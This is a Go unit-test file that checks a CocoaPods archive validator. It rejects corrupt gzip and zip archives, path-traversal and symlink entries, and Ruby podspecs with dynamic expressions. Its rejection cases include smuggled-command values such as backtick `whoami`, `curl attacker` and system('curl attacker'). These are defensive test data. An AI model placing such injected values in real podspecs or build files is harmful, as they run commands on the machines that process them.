package cocoapods

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"fmt"
	"strings"
	"testing"
)

func packed(t *testing.T, entries []tar.Header, contents []string) []byte {
	t.Helper()
	var out bytes.Buffer
	gz := gzip.NewWriter(&out)
	tw := tar.NewWriter(gz)
	for i, header := range entries {
		header.Size = int64(len(contents[i]))
		if err := tw.WriteHeader(&header); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(contents[i])); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func TestUnitHTTPSourceArchiveIntegrity(t *testing.T) {
	tgz := packed(
		t,
		[]tar.Header{{Name: "Sources/HelloPod.m", Typeflag: tar.TypeReg}},
		[]string{"void hello(void) {}\n"},
	)
	if err := ValidateSourceArchive(bytes.NewReader(tgz), int64(len(tgz)), ".tar.gz"); err != nil {
		t.Fatalf("valid source tar: %v", err)
	}
	corrupt := bytes.Clone(tgz)
	corrupt[len(corrupt)-7] ^= 0xff
	if err := ValidateSourceArchive(
		bytes.NewReader(corrupt),
		int64(len(corrupt)),
		".tar.gz",
	); err == nil {
		t.Fatal("corrupt gzip trailer admitted")
	}
	unsafeTar := packed(
		t,
		[]tar.Header{{Name: "../outside", Typeflag: tar.TypeReg}},
		[]string{"unsafe"},
	)
	if err := ValidateSourceArchive(
		bytes.NewReader(unsafeTar),
		int64(len(unsafeTar)),
		".tgz",
	); err == nil {
		t.Fatal("traversal tar admitted")
	}
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	f, err := zw.Create("Sources/HelloPod.m")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.Write([]byte("void hello(void) {}\n")); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := ValidateSourceArchive(
		bytes.NewReader(out.Bytes()),
		int64(out.Len()),
		".zip",
	); err != nil {
		t.Fatalf("valid source zip: %v", err)
	}
	broken := bytes.Clone(out.Bytes())
	// The stored member uses DEFLATE; damage its compressed body while
	// leaving the central directory and advertised CRC intact.
	dataStart := bytes.Index(broken, []byte("Sources/HelloPod.m")) + len("Sources/HelloPod.m")
	broken[dataStart+3] ^= 0xff
	if err := ValidateSourceArchive(
		bytes.NewReader(broken),
		int64(len(broken)),
		".zip",
	); err == nil {
		t.Fatal("corrupt zip member admitted")
	}
}

func TestUnitStaticRubyPodspec(t *testing.T) {
	static := `Pod::Spec.new do |s|
  s.name = 'HelloPod'
  s.version = '1.0.0'
  s.summary = 'A real static pod'
  s.homepage = 'https://example.org/pod'
  s.license = { :type => 'MIT' }
  s.authors = { 'Example' => 'example@example.org' }
  s.source = {
    :http => 'https://example.org/HelloPod.tar.gz',
  }
  s.source_files = 'Sources/*.{h,m}'
  s.ios.deployment_target = '12.0'
  s.dependency 'FoundationKit', '~> 1.0'
  s.subspec 'Core' do |ss|
    ss.source_files = 'Sources/*.{h,m}'
    ss.dependency 'FoundationKit', '~> 1.0'
  end
end`
	data := packed(
		t,
		[]tar.Header{{Name: "HelloPod.podspec", Typeflag: tar.TypeReg}},
		[]string{static},
	)
	a, err := ReadArchive(bytes.NewReader(data), int64(len(data)), "HelloPod", "1.0.0")
	if err != nil {
		t.Fatal(err)
	}
	var spec map[string]any
	if err := json.Unmarshal(a.Spec, &spec); err != nil {
		t.Fatal(err)
	}
	if spec["name"] != "HelloPod" || spec["version"] != "1.0.0" ||
		spec["source_files"] != "Sources/*.{h,m}" {
		t.Fatalf("normalized static podspec: %+v", spec)
	}
	if got := spec["dependencies"].(map[string]any)["FoundationKit"].([]any)[0]; got != "~> 1.0" {
		t.Fatalf("dependency: %v", got)
	}
	child := spec["subspecs"].([]any)[0].(map[string]any)
	if child["name"] != "Core" || child["source_files"] != "Sources/*.{h,m}" {
		t.Fatalf("static subspec: %v", child)
	}
	for _, unsafe := range []string{
		"s.version = `whoami`", "s.version = ENV['VERSION']",
		"s.version = \"#{ENV['VERSION']}\"", "system('curl attacker')",
		"s.version = '1.0' + '0'",
	} {
		bad := strings.Replace(static, "s.version = '1.0.0'", unsafe, 1)
		body := packed(
			t,
			[]tar.Header{{Name: "HelloPod.podspec", Typeflag: tar.TypeReg}},
			[]string{bad},
		)
		if _, err := ReadArchive(
			bytes.NewReader(body),
			int64(len(body)),
			"HelloPod",
			"1.0.0",
		); err == nil {
			t.Fatalf("unsafe expression %q was admitted", unsafe)
		}
	}
	for _, expression := range []string{`ENV['SOURCE']`, `"#{ENV['SOURCE']}"`, "`curl attacker`"} {
		bad := strings.Replace(static, "'https://example.org/HelloPod.tar.gz'", expression, 1)
		body := packed(
			t,
			[]tar.Header{{Name: "HelloPod.podspec", Typeflag: tar.TypeReg}},
			[]string{bad},
		)
		if _, err := ReadArchive(
			bytes.NewReader(body),
			int64(len(body)),
			"HelloPod",
			"1.0.0",
		); err == nil {
			t.Fatalf("dynamic multiline hash value %q admitted", expression)
		}
	}
}

func TestUnitArchiveIdentityAndIntegrity(t *testing.T) {
	spec := `{"name":"HelloPod","version":"1.0.0","summary":"proof"}`
	good := packed(t, []tar.Header{
		{Name: "HelloPod.podspec.json", Typeflag: tar.TypeReg},
		{Name: "Sources/HelloPod.m", Typeflag: tar.TypeReg},
	}, []string{spec, "void hello(void) {}\n"})
	a, err := ReadArchive(bytes.NewReader(good), int64(len(good)), "HelloPod", "1.0.0")
	if err != nil || a.Name != "HelloPod" || !bytes.Equal(a.Spec, []byte(spec)) {
		t.Fatalf("valid CocoaPods archive: %+v, %v", a, err)
	}
	if Path("HelloPod", "1.0.0") != "HelloPod/1.0.0/HelloPod-1.0.0.tar.gz" ||
		SpecPath("HelloPod", "1.0.0") != "Specs/b/f/0/HelloPod/1.0.0/HelloPod.podspec.json" {
		t.Fatal("CocoaPods canonical path or MD5 shard changed")
	}
	for _, tc := range []struct {
		name, version, file, body string
		kind                      byte
	}{
		{"HelloPod", "1.0.0", "HelloPod.podspec.json", `{"name":"Other","version":"1.0.0"}`, tar.TypeReg},
		{"HelloPod", "1.0.0", "../HelloPod.podspec.json", spec, tar.TypeReg},
		{"HelloPod", "1.0.0", "HelloPod.podspec.json", "", tar.TypeSymlink},
		{"HelloPod", "1.0.0", "HelloPod.podspec", "Pod::Spec.new", tar.TypeReg},
	} {
		t.Run(fmt.Sprintf("%s-%d", tc.file, tc.kind), func(t *testing.T) {
			data := packed(t, []tar.Header{{Name: tc.file, Typeflag: tc.kind}}, []string{tc.body})
			if _, err := ReadArchive(
				bytes.NewReader(data),
				int64(len(data)),
				tc.name,
				tc.version,
			); err == nil {
				t.Fatal("invalid CocoaPods archive admitted")
			}
		})
	}
	corrupt := append([]byte(nil), good...)
	corrupt[len(corrupt)-7] ^= 0xff
	if _, err := ReadArchive(
		bytes.NewReader(corrupt),
		int64(len(corrupt)),
		"HelloPod",
		"1.0.0",
	); err == nil {
		t.Fatal("corrupt gzip trailer admitted")
	}
	if _, err := ReadArchive(
		strings.NewReader("x"),
		MaxArchiveBytes+1,
		"HelloPod",
		"1.0.0",
	); err == nil {
		t.Fatal("oversized archive admitted")
	}
}
